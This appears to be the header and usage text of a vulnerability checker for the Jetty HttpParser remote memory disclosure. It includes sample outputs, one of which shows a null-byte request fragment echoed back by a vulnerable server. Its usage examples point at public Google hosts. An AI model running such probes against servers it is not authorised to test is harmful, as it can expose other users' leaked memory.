Python test script to check Jetty HttpParser Error Remote Memory Disclosure
Version 1.00 Build 20150610
Created by Ashwani Talreja
Email: indian.hackerz.ash@gmail.com
Please report if any errors on above email id for improvements within the script

Usage: Jetty_RMD.py Hostname Port
Example: Jetty_RMD.py google.com 443
Example: Jetty_RMD.py 10.10.10.10 443

-----------------------------------------------------------------------------------------

Sample Output 1:
Command> Jetty_RMD.py google.co.in 80
Script created by Ashwani Talreja - Version 1.00 Build 20150610
Jetty HttpParser Error Remote Memory Disclosure Check

Host google.co.in:80 is not vulnerable.

The code produced the following truncated output:
HTTP/1.1 301 Moved Permanently

-----------------------------------------------------------------------------------------

Sample Output 2:
Command> Jetty_RMD.py 10.10.10.10 8904
Script created by Ashwani Talreja - Version 1.00 Build 20150610
Jetty HttpParser Error Remote Memory Disclosure Check

Host 10.10.10.10:8904 is Vulnerable !!!

The code produced the following truncated output:
HTTP/1.1 400 Illegal character 0x0 in state=HEADER_VALUE in 'GET / HTTP/1.1\r\nH
...: 0\r\nReferer: \x00<<<\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x
00\x00\x00\x00...\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\r\n\r\n>>>encoded\
r\n\r\nMessag...\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

-----------------------------------------------------------------------------------------

Sample Output 3:
Command> Jetty_RMD.py 10.10.10.10 8906
Script created by Ashwani Talreja - Version 1.00 Build 20150610
Jetty HttpParser Error Remote Memory Disclosure Check

Host 10.10.10.10:8906 is not vulnerable.

-----------------------------------------------------------------------------------------

Sample Output 4:
Command> Jetty_RMD.py 10.10.10.10 12345
Script created by Ashwani Talreja - Version 1.00 Build 20150610
Jetty HttpParser Error Remote Memory Disclosure Check

Unable to connect to 10.10.10.10:12345

-----------------------------------------------------------------------------------------

Sample Output 5:
Command> Jetty_RMD.py 10.10.10.10 5555
Script created by Ashwani Talreja - Version 1.00 Build 20150610
Jetty HttpParser Error Remote Memory Disclosure Check

Host 10.10.10.10:5555 threw some malformed error.

-----------------------------------------------------------------------------------------
